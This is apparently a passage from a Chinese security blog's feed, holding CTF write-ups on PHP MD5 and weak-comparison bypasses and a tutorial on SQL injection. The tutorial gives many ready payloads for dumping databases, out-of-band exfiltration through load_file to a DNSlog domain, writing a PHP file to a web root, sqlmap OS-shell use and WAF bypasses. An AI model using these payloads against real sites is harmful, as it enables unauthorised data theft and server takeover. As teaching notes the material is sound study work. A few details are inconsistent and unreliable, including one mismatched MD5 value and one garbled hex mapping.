+// 原始值 =&gt; MD5哈希&quot;240610708&quot; =&gt; &quot;0e462097431906509019562988736854&quot;,&quot;QNKCDZO&quot;   =&gt; &quot;0e830400451993494058024219903391&quot;,&quot;aabg7XSs&quot;  =&gt; &quot;0e087386482136013740957780965295&quot;,&quot;aabC9RqS&quot;  =&gt; &quot;0e041022518165728065344349536299&quot;,&quot;s878926199a&quot; =&gt; &quot;0e545993274517709034328855841020&quot;,&quot;s155964671a&quot; =&gt; &quot;0e342768416822451524974117254469&quot;,
+
+
+访问如下 URL 即可触发条件并获取 Flag：
+
+http://63a977ac-9022-493d-a0ff-b3294262a7be.challenge.ctf.show/?v1=QNKCDZO&amp;v2=240610708
+
+
+三、[BJDCTF2020] Easy MD51. 题目
+2. 解题思路
+随便输入点东西点击”提交查询”发现没有任何回显，所以这里查看一下页面源代码，看一下是否有提示。
+
+看到header联想到HTTP的头。
+
+
+
+
+浏览器开发者工具，在消息头中找到线索hint。
+
+
+select * from &#x27;admin&#x27; where password=md5($pass,true)
+
+给了一个sql语句，我们需要输入一个密码但是我们并不知道正确密码。这里需要利用md5绕过，让sql语句变成如下形式：
+select * from &#x27;admin&#x27; where password=&#x27;&#x27; or &#x27;
+
+
+payload：ffifdyop
+
+
+md5($pass, true) 会返回 16 位原始二进制字符串，而非 32 位十六进制字符串。
+Payload 原理：输入字符串 ffifdyop 时，md5(&#39;ffifdyop&#39;, true) 生成的二进制字符串开头为 &#39;or&#39;6，拼接后 SQL 语句变为：
+
+select * from admin where password=&#x27;or&#x27;6xxxxxxxx
+
+or 后面非空字符串 &#39;6xxx&#39; 等价 true，整个条件恒成立，构造永真条件，绕过密码验证。
+
+
+查看页面源代码。
+
+
+PHP 中 == 是弱类型比较，以 0e 开头的字符串会被解析为科学计数法（值为 0），不同字符串的 MD5 若均以 0e 开头，比较结果为真。
+
+Payload（任选其一）：
+科学计数法绕过：”0e”开头的字符串都会以科学计数法来解析，而0的乘积都为0。所以构造md5加密后开头为0e的字符串即可：
+
+
+
+?a=QNKCDZO&amp;b=240610708
+
+
+
+数组绕过：
+
+?a[]=1&amp;b[]=2
+
+（PHP 中 md5(数组) 返回 null，null == null 为真，且 a[] != b[]）
+
+
+用POST方法传递数值，不能用GET方式。
+
+
+param1[]=1&amp;param2[]=2
+
+
+
+四、[CTFShow] web91. 题目
+2. 解题思路
+尝试登录，盲猜密码，无报错，无反应。
+
+找源码泄露，先试最常见的泄露路径：
+
+
+
+index.php
+index.php.swp
+index.php.bak
+robots.txt
+index.phps
+
+
+访问 index.phps 成功拿到源码。
+
+
+
+分析源码：
+
+
+从泄露的源码里，看到核心逻辑：
+$sql = &quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;
+
+
+关键漏洞：md5($password, true) 返回原始二进制字符串，如果这个字符串包含 &#39;or&#39;，就会构造出恒成立的 SQL 语句。
+
+
+构造 payload：一个能让 MD5 二进制包含 &#39;or&#39; 的密码，用经典的 ffifdyop 作为密码。
+
+
+它的 MD5 原始二进制值包含 &#39;or&#39;，代入 SQL 后变成：
+
+select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;or&#x27;6xxxx&#x27;
+
+
+输入 ffifdyop，拿到flag。
+
+
+3. 知识点总结(1) 常见Web源码泄露场景核心区分
+
+
+文件类型
+服务器处理逻辑
+访问结果
+
+
+
+index.php
+调用PHP解释器执行代码
+仅显示页面内容，无源码
+
+
+各类备份&#x2F;泄露文件
+直接返回纯文本&#x2F;缓存内容
+可查看完整PHP源码
+
+
+高频源码泄露文件&#x2F;路径
+
+
+泄露类型
+典型路径
+产生原因
+
+
+
+PHP源码预览文件
+index.phps
+服务器配置为直接返回.phps后缀源码
+
+
+Vim缓存文件
+index.php.swp&#x2F;.swo&#x2F;.swn
+Vim编辑意外退出（死机&#x2F;断电）生成的缓存
+
+
+手动备份文件
+index.php.bak&#x2F;.backup
+开发者手动保存的源码备份
+
+
+编辑器自动备份
+index.php~
+Emacs等编辑器自动生成的备份文件
+
+
+版本控制文件
+.git/&#x2F;.svn/
+代码版本控制文件夹未删除
+
+
+敏感路径提示
+robots.txt
+网站声明的禁止爬虫路径，可能泄露后台&#x2F;源码路径
+
+
+]]></content>
+      <categories>
+        <category>CTF-WP</category>
+        <category>Lab-WP</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入漏洞</title>
+    <url>/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[1. 什么是 SQL 注入SQL注入是一种常见的网络安全漏洞和攻击方式，它利用应用程序对用户输入数据的处理不当，使得攻击者能够在执行SQL查询时插入恶意的SQL代码。通过成功注入恶意代码，攻击者可以执行未经授权的数据库操作，获取敏感信息、篡改数据甚至完全破坏数据库。
+SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）里，不是输正常内容，而是偷偷塞一段 SQL 数据库命令，想骗数据库执行，达到偷数据、删数据甚至改网站的目的。
+
+2. SQL 注入分类常见的注入点：
+?str=xxx?test=xxx?idstr=xxx?id=xxx
+
+2.1 union 注入2.1.1 概念：union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.
+2.1.2 适用条件：（1）网页存在注入点，有回显。
+（2）需要满足union语句要求，即：
+union前后两个select的结果集应具有相同列数；
+union前后两个select的结果集对应列应是相同数据类型
+2.1.3 注入步骤：
+首先判断是否存在注入点及注入的类型。
+
+https://地址/?id=1通过修改id的值判断是否存在注入点
+
+
+使用ORDER BY 查询列数
+
+https://地址/?id=1 order by 1修改 order by 后面的数据不报错代表存在，报错即为最大列数
+
+
+判断回显的位置
+
+?id=-1 union select 1,2,3注意：这里的id不可以填1，因为1是真实存在的，而我们不想查到真实存在的数据，所以要改成一个不存在的数：-1
+
+
+获取数据库名
+
+以三个字段数为例：
+?id=-1 union select 1,2,database()		//查询当前数据库?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata		// 查询所有数据库名
+
+
+获取数据库中的所有表名
+
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where tables_schema=&#x27;数据库名&#x27;
+
+
+获取数据库的表中的所有字段名
+
+?id=-1 union select 1,2,group_concat(colunm_name) from information_schema.colunms where tables_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;
+
+
+获取字段中的数据。
+
+?id=-1 union select 1,2,目标字段 from 目标表名 limit 0,1// 如果想要数据一一对应，使用concat将多个字段内容合并为输出// 例如：?id=-1 union select 1,2,concat(username, &#x27;:&#x27;, password) from users limit 0,1
+
+2.1.4 总结
+union 注入要求存在注入点，有回显
+需要满足 union 语句要求
+
+2.2 报错注入2.2.1 概念报错注⼊是利⽤⽹站的报错信息来带出我们想要的信息，就是在错误信息中执⾏sql语句
+2.2.2 使用条件考虑到成功率和时间成本⽐union成本⾼，需要数据库有错误信息，⼀般在union条件不能实施的时候，在查询，新增，修改能都使⽤
+2.2.3 报错注入命令该部分参考：https://cloud.tencent.com/developer/article/2159753
+groupby重复键冲突利⽤count()、rand()、floor()、groupby这⼏个特定的函数结合在⼀起产⽣的注⼊漏洞
+?id=1 and (select 1 from (select count(*),concat(0x5e,(目标查询语句),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+核心是利用 count(*) + rand() + group by 触发主键重复错误，把 concat 包裹的目标数据（如版本号、表名）带出，无需页面回显也能拿到数据（当 union 被禁用时）。
+1、 命令解释
+1. `count(*)`
+
+统计有多少行数据，用来触发分组。
+2. `rand(0)`
+
+生成固定的随机数（不是真随机， predictable）
+3. `floor(rand(0)*2)`
+
+结果只有两个：0 或者 1
+4. `group by x`
+
+按 x 分组，MySQL 会建一张临时表存分组结果。
+5. `concat(0x5e, 数据, 0x5e)`
+
+把 版本号 &#x2F; 库名 &#x2F; 表名 拼进字符串里。
+- `0x5e` = **^** 符号，只是分隔符
+
+2、 问题：
+为什么会报错？
+MySQL 做 group by 时：
+
+先算 floor(rand(0)*2) → 得到 0 或 1
+把结果插入临时表
+插入时又算了一次 rand (0)
+两次结果不一样 → 出现重复键
+直接报错：Duplicate entry（重复条目）
+关键：**报错的时候，会把我们拼接的【数据】一起输出来！**数据就这样拿到了。
+
+为什么 rand (14) 更好？
+rand (14) 只需要 2 条数据就能触发冲突rand (0) 需要 3 条数据 才会报错。
+3、 总结
+
+用 rand() 生成 0&#x2F;1
+用 group by 建临时表
+插入时重复计算 rand ()
+产生重复键报错
+错误信息里带出我们要的数据
+
+3、 如何使用
+不懂原理知道如何使用即可，想查什么，就把 version() 换成：
+
+database() → 查库名
+table_name → 查表名
+column_name → 查字段
+password → 查数据
+
+示例：
+?id=1 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+把想要的数据（这里是 version()）爆在报错信息里。
+xpath报错MySQL 有两个 XML 函数：extractvalue ()、updatexml ()
+只要给它不符合 XPath 语法的字符串，它就会报错，并把错误内容直接显示出来。
+extractvalue()?id=1 and extractvalue(1, concat(0x5c, (查询语句), 0x5c))
+
+
+作用：从 XML 里查数据。
+语法：
+
+extractvalue( XML文档, XPath路径 )
+
+updatexml()?id=1 and updatexml(1, concat(0x5e, (查询语句), 0x5e), 1)
+
+
+作用：修改 XML 里的数据。
+语法：
+
+updatexml( XML文档, XPath路径, 新值 )
+
+
+注意：
+
+updatexml() 仅能获取返回32位字符，对于长字符串需要分批次获取：
+&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,1,16)) from users limit 0,1),0x5e),1) or &#x27;&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,17)) from users limit 0,1),0x5e),1) or &#x27;
+
+0x5e、0x5c 是什么？
+0x5e → ^
+0x5c → ____
+
+作用：破坏 XPath 语法，强制报错。
+攻击语句INSERT INTO messages(字段1, 字段2, 字段3) VALUES (&#x27;&#x27;, &#x27;&#x27;, &#x27; 攻击语句 &#x27;);// 例如：$sql = &quot;INSERT INTO messages(`uname`,`title`,`content`) VALUES (&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27; or extractvalue(1, concat(0x5c, database(), 0x5c)) or &#x27;&#x27;)&quot;;
+
+
+获得数据库名字
+
+&#x27; or extractvalue(1, concat(0x5c, (select database() from information_schema.tables limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select database() from information_schema.tables limit 0,1), 0x5e), 1) or &#x27;
+
+
+获得表名
+
+&#x27; or extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5e), 1) or &#x27;
+
+
+获得表的字段
+
+&#x27; or extractvalue(1, concat(0x5c, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5e), 1) or &#x27;
+
+
+获得数据
+
+&#x27; or extractvalue(1, concat(0x5c, (select concat(字段1,&#x27;:&#x27;,字段1) from 表名 limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select concat(字段2,&#x27;:&#x27;,密码2) from 表名 limit 0,1), 0x5e), 1) or &#x27;
+
+2.3 布尔盲注2.3.1 概念当改变浏览器传给后台SQL的参数后，浏览器没有显⽰对应内容也没有显⽰报错信息时，⽆法使⽤ union联合查询注⼊与报错注⼊，这时候可以试试看能否使⽤布尔注⼊
+2.3.2 使用条件⼀般情况下，当带⼊参数为真和假时，⻚⾯会有不同的反映，⽐如有⽆显⽰也是⼀种不同，布尔盲注就是根据这种不同来反推我们输⼊的条件是真还是假。
+2.3.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
+
+判断是否存在布尔注入使用布尔条件，绕过真假不同条件的时候，页面有变化，可以考虑使用布尔注入。
+
+?id=2 and 1=1?id=2 and 1=2
+
+
+猜解数据库名
+
+a. 判断库名长度
+?id=1 and length(database())&lt;数值?id=1 and length(database())&gt;数值?id=1 and length(database())=数字
+
+示例（假设数据库名为 data）：
+?id=1 and length(database())&lt;5?id=1 and length(database())&gt;2?id=1 and length(database())=4		// true 说明数据库名的长度为4
+
+b. 逐字符猜库名可以使用ASCII码，甄别出数据库每一个字符
+
+
+数据库的名字⼀般都是a-z,A-Z组成，也可能出现数字、下划线等字符
+?id=1 and ascii(substr(database(),第几位,1))&lt;ASCII值?id=1 and ascii(substr(database(),第几位,1))&gt;ASCII值?id=1 and ascii(substr(database(),第几位,1))=ASCII值/*substr(database(), 第几位, 1)：表示从database()返回的字符串中，“第几位”，就是截取第几个字符。比如 data 中，d就是第一位*/?id=1 and ascii(substr(database(),1,1))&lt;123	// 122为z?id=1 and ascii(substr(database(),1,1))&gt;64	// 65为A
+
+示例（库名：data）：
+?id=1 and ascii(substr(database(),1,1))&lt;123	//true?id=1 and ascii(substr(database(),1,1))&gt;64	//true?id=1 and ascii(substr(database(),1,1))&gt;100	//true?id=1 and ascii(substr(database(),1,1))&gt;110	//false?id=1 and ascii(substr(database(),1,1))=100	//true 100对应d?id=1 and ascii(substr(database(),2,1))=97	//true 97对应a?id=1 and ascii(substr(database(),3,1))=116 //true 116对应t?id=1 and ascii(substr(database(),4,1))=97	//true 97对应a// 合起来库名就是data
+
+c. 验证库名
+?id=1 and database()=&#x27;库名&#x27;
+
+示例（库名：data）：
+?id=1 and database()=&#x27;data&#x27;
+
+
+猜解库内数据表
+
+a. 判断表数量
+?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())=数量	//知道有几个表
+
+b. 判断表名长度
+// 判断单张表?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 数字// 判断多张表：?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1))=长度// 偏移量：= 第几个表 / 第几个字段，从 0 开始数！//比如：-- 第1张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 0,1))=长度-- 第2张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 1,1))=长度
+
+示例（表名：users）：
+?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;10?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;5?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1)) = 5
+
+c. 逐字符猜解表名
+?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&lt;ASCII值	//先判断范围?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))&gt;ASCII值	?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))=ASCII值	//再确定字符?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 偏移量,1),第几位,1))=ASCII值// 直接填爆出来的库名或者database()都可以
+
+示例（表名：users，以第一个字符 u 为例）：
+?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;120?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117	//true 117对应u 说明表名中有一个字母是u
+
+
+猜解表内字段
+
+a.  判断字段总数
+?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;)=数值
+
+更改数值，挨个测试，表名填自己想查询的表名。
+示例（假如 users 表里面有两个字段分别是 username 和  password）：
+?id=1 and (select count(column_name) from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27;)=2
+
+b. 判断字段名长度
+?id=1 and length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1))=长度
+
+示例（查第一个字段名的长度）：
+?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;10?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))&lt;1?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))=8 // 第一个字段的长度是8个字符
+
+c. 逐字符猜字段名
+?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1),第几位,1))=ASCII值
+
+示例（以 username 为例，查第一个字符 u）：
+?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;100?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;110?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=117
+
+
+猜解表中数据
+
+a. 判断数据长度
+?id=1 and (select LENGTH(字段名) from 表名 limit 0,1)=长度
+
+示例：假设获得username 字段第一行数据的内容长度为 2
+?id=1 and (select LENGTH(username) from users LIMIT 0,1)=5
+
+b. 逐字符猜数据内容
+?id=1 and ascii(substr((select 字段名 from 表名 limit 偏移量,1),第几位,1))=ASCII值
+
+示例：假设获得user字段第一行数据第一个字符内容
+?id=1 and ascii(substr((select name from users limit 0,1),1,1))=97?id=1 and ascii(substr((select name from users limit 0,1),2,1))=100
+
+2.4 延迟盲注2.4.1 概念也称延时注入、时间注入等，这种注入方式在传给后台的参数中，设置了一个if语句，当条件为真时执行sleep语句，条件为假时无执行语句，然后根据浏览器的响应时间来推测sleep语句是否被执行，进而推测if条件是否为真。延时盲注与布尔盲注的核心思想都是通过浏览器两种不同的响应来推测输入的条件的真假，布尔盲注是条件真假时页面会有不同显示，延时盲注则是显示结果真假只能从响应时间上进行推测。
+2.4.2 使用条件union、报错、布尔等搞不定的时候才考虑，效率极低。
+2.4.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
+
+测试延时注入点
+
+?id=1 and sleep(秒数)
+
+示例：
+?id=1 and sleep(5)
+
+
+猜数据库名
+
+a. 判断库名长度
+?id=1 and if(length(database())=数值,sleep(5),1)
+
+示例：
+?id=1 and if(length(database())=4,sleep(5),1)
+
+b. 逐字符猜库名
+?id=1 and if(ascii(substr(database()),位数,1)=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr(database(),1,1))=100,sleep(5),1)?id=1 and if(ascii(substr(database(),2,1))=97,sleep(5),1)
+
+
+猜数据表名
+
+a. 判断表名长度
+?id=1 and if(length((select table_name from information_schema.tables where table_schema=库名 limit 序号,1))=数值,sleep(5),1)
+
+示例（库名为 data，长度为 4）：
+?id=1 and if(length((select table_name from information_schema.tables where table_schema=data limit 0,1))=4,sleep(5),1)
+
+b. 逐字符猜表名
+?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=data limit 0,1),1,1))=117,sleep(5),1)
+
+
+猜字段名
+
+a. 判断字段名长度
+?id=1 and if(length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1))=数值,sleep(5),1)
+
+示例
+?id=1 and if(length((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1))=4,sleep(5),1)
+
+b. 逐字符猜字段
+?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=data and table_name=&#x27;users&#x27; limit 0,1),1,1))=110,sleep(5),1)
+
+
+猜表内数据
+
+?id=1 and if(ascii(substr((select 字段名 from 表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
+
+示例：
+?id=1 and if(ascii(substr((select name from users limit 0,1),1,1))=97,sleep(5),1)
+
+注解
+
+序号：表 &#x2F; 字段排序，从 0 开始计数
+位数：字符串截取位置
+sleep (5)：条件成立延迟 5 秒响应
+
+2.5 DNSlog 盲注2.5.1 概念DNSlog盲注就是通过load_file函数发起请求，然后去DNSlog平台接收数据，需要用到load_file函数，就是需要用到root用户读写文件的功能。
+2.5.2 查看配置show VARIABLES like &#x27;secure_file_priv&#x27;
+
+
+secure_file_priv&#x3D;null 不允许导入导出
+secure_file_priv&#x3D;tmp&#x2F; 只能在tmp目录
+secure_file_priv&#x3D; 无限制
+
+2.5.3 有权限直接读取
+读取路径：
+
+?id=-1 union select 1,2,3,@@datadir
+
+
+读取文件：
+
+?id=-1 union select 1,2,3,load_file(&#x27;文件完整路径&#x27;)
+
+示例：（\ 转义）
+?id=-1 union select 1,2,3,load_file(&#x27;C:\\phpStudy\\WWW\\config.php&#x27;)
+
+
+写入文件：
+
+?id=-1 union select 1,2,3,&#x27;写入内容&#x27; into outfile &#x27;文件保存路径&#x27;
+
+示例：
+?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:\\phpStudy\\WWW\\shell.php&#x27;?id=-1 union select 1,2,3,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;C:/phpStudy/WWW/shell.php&#x27;
+
+2.5.4 采用 DNSlog 带外获取http://dnslog.cn/  
+
+
+实操：点击 Get SubDomain 获取域名 xgikzx.dnslog.cn  
+
+
+
+查当前库名
+
+?id=1 and load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.获取的域名/123&#x27;))
+
+注入后，点击网站的 Refresh Record 就会返回数据库名。
+
+查表名
+
+// 获取第一张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.获取的域名/123&#x27;))// 获取第二张表?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&#x27;.获取的域名/123&#x27;))
+
+2.6 二次注入2.6.1 概念二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
+2.6.2 实战
+碰撞用户，确认用户名 admin 存在
+注册用户名：admin&#39;#
+修改密码时执行SQL：
+
+update users set password=md5(&#x27;123456&#x27;) where name=&#x27;admin&#x27;#&#x27;
+
+admin&#39;#的密码没变，修改的是admin的密码
+2.7 堆叠注入2.7.1 概念在SQL数据库中，每条语句是以;分开的，堆叠注入就是一次性注入并执行多条语句（多语句之间以分号隔开）的注入方式。与 union 对比：union 联合查询注入执行的语句是有限的，可以用来执行查询语句。堆叠注入可以执行任意语句，比如增删改查。
+2.7.2 实战
+获取库名、表名、字段名、数据等信息
+构造攻击语句：
+
+?id=2;insert into users (name,password) values(&#x27;admin&#x27;,md5(&#x27;admin&#x27;));
+
+
+3. SQLMap工具运用
+官⽹：https://sqlmap.org/
+作⽤： sqlmap是⼀个开源的渗透测试⼯具，它可以⾃动化检测和利⽤SQL注⼊漏洞并接管数据库服务器。它有⼀个强⼤的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项。注意：kali⾃带
+
+3.1 常用命令//检测漏洞sqlmap -u &#x27;http://xxx?id=2&#x27;//查询当前数据库sqlmap -u &#x27;url&#x27; --current-db//查当前库有哪些表名sqlmap -u &#x27;url&#x27; -D 库名 --tables//某表有哪些字段sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 --columns//列出数据sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 -C 字段 --dump//其他：//执行sqlsqlmap -u &#x27;url&#x27; --sql-shell//执行系统命令sqlmap -u &#x27;url&#x27; --os-shell//读取文件sqlmap -u &#x27;url&#x27; --file-read &quot;d:/e.txt&quot;
+
+3.2 绕过WAFsqlmap -u &#x27;url&#x27; --tamper=passdog.py
+
+
+4. SQL注入绕过4.1 提交方式更改GET 改 POST
+安全狗（WAF 防御）
+4.2 特殊字符绕过database/**/()
+
+4.3 参数污染?id=1/**&amp;id=-1 union select 1,2,3,4%23*/
+
+4.4 数据库特性绕过/*!44509select*/
+
+
+5. SQL注入防护
+过滤：限制长度、识别恶意关键字
+转义：用户输入当文本
+数据库权限控制、敏感数据加密
+预编译（参数化查询）
+
+
+6. 总结
+报错注入是在 union 注入在查询不到的情况下，才使用
+在使用报错注入的时候要关注报错注入的函数extractvalue()、updatexml()
+
+
+本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP特性利用之弱比较</title>
+    <url>/2026/06/23/PHP%E5%BC%B1%E6%AF%94%E8%BE%83/index/</url>
+    <content><![CDATA[一、前置知识1. 基础概念区分
+== 弱比较PHP会自动隐式转换两边数据类型后再对比，是所有CTF弱类型题的核心漏洞点。
+
+=== 强比较同时校验值 + 数据类型，不做任何自动转换，无法用弱类型绕过，是标准防御写法。
+
+
+2. 绕过方法(1) 0e MD5 科学计数法绕过
+原理
+
+
+以 0e 开头且后续全为纯数字的字符串，在进行弱比较（==）时，会被 PHP 强制解析为科学计数法 0 × 10^n = 0。因此，任意两个满足此格式的字符串 == 判定恒为 true。
+示例：
+
+$a = md5(&#x27;240610708&#x27;); // 0e462097431906509019562988736854$b = md5(&#x27;QNKCDZO&#x27;);   // 0e830400458393240665909944582762var_dump($a == $b); // truevar_dump($a === $b);// false
+
+
+适用场景：后端使用弱比较判断两个不同输入的 MD5 或 SHA1 值是否相等。
+
+(2) 数字字符串截断匹配
+原理（PHP 8 之前）
+
+
+字符串和数字进行弱对比时，PHP 会从字符串开头提取数字，后面的字母直接丢弃。如果开头没有数字，则直接转为 0。
+示例：
+
+var_dump(123 == &quot;123abc&quot;);  // truevar_dump(0 == &quot;abc123&quot;);    // true，无开头数字直接转为0var_dump(0 == &quot;flag&quot;);     // true
+
+
+注意：PHP 8 此特性已废弃。PHP 8 会将数字转为字符串再比较，0 == &quot;flag&quot; 的结果变为 false。
+
+适用场景：要求传入的参数等于某个特定数字，传入”数字+字母”或”字母”触发隐式转换绕过（仅限 PHP 7 及以下）。
+
+
+(3) ffifdyop MD5 SQL注入绕过$sql = &quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;
+
+
+原理
+
+
+当后端使用 md5($password, true) 时，第二个参数 true 会让函数返回 16 字节的原始二进制格式，而不是 32 位的十六进制字符串。
+
+
+利用方式
+
+
+明文 ffifdyop 的 MD5 二进制数据中，恰好包含字符串 &#39;or&#39;6。拼接到 SQL 语句：
+拼接前：
+
+
+
+select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;
+
+
+拼接后：
+
+select * from user where username =&#x27;admin&#x27; and password =&#x27;&#x27;or&#x27;6...&#x27;
+
+这闭合了单引号，并形成了 or 6 的永真条件，直接绕过登录验证。我在 PHP特性利用之 MD5 这篇中有提到这种题目。
+(4) 数组绕过数组和字符串直接比较 [] == &quot;admin&quot; 结果是 false。真正的漏洞在于 PHP 的内置处理函数。
+
+利用方式
+
+
+md5()、sha1()、strcmp() 等函数期望接收字符串。如果传入数组（如：pass[]=1），函数无法处理会报错并返回 null。
+
+示例 1（弱比较绕过）
+
+
+strcmp($pass, &quot;admin&quot;) == 0
+
+传入数组后函数返回 null，随后 null == 0 判定为 true，成功绕过。
+
+示例 2（强比较绕过）
+
+$a !== $bmd5($a) === md5($b)
+
+传入两个不同的数组，哈希函数均返回 null，随后 null === null 判定为 true，成功绕过。
+
+注意：在 PHP 8 中，向这类函数传入数组不再返回 null，而是直接抛出 TypeError 致命错误导致程序崩溃，该方法失效。
+
+3. 总结通用类型转换规则：
+
+数字与字符串：PHP 8 之前：字符串转数字（从头截取，无数字转0）。PHP 8 及以后：数字转字符串比较。
+0e 规则：0e开头纯数字 &#x3D;&#x3D; 0e开头纯数字，结果恒为 true。
+数组特性：数组与任意数字或字符串直接弱比较，结果为 false。数组传入 md5 或 strcmp 等仅接收字符串的函数，返回 null（PHP 8 之前）或直接报错（PHP 8 及以后）。
+null == false == 0 == &quot;&quot; 互相弱比较全为 true。注意：PHP 8 中 0 == &quot;&quot; 的结果变为 false。
+
+
+二、[攻防世界] simple_php1. 题目
+
+2. 解题思路
+读代码
+
+&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a = @$_GET[&#x27;a&#x27;];$b = @$_GET[&#x27;b&#x27;];if ($a == 0 and$a) &#123;    echo$flag1;&#125;if (is_numeric($b)) &#123;    exit();&#125;if ($b &gt; 1234) &#123;    echo$flag2;&#125;?&gt;
+
+
+$a 的要求：弱等于 0，但又不能是 0 或空值（比如 0a、abc）。
+$b 的要求：不能是纯数字&#x2F;数字字符串，但弱比较要大于 1234（比如 1235a）。
+
+
+构造Payload如 ?a=0a&amp;b=1235a 即可同时获取 flag1 和 flag2。
+
+
+
+三、[攻防世界] PHP21. 题目
+2. 解题思路
+这句话 “Can you authenticate to this website?” 的意思是：”你能通过这个网站的身份验证吗？” 或 “你能登录&#x2F;认证到这个网站吗？”
+
+
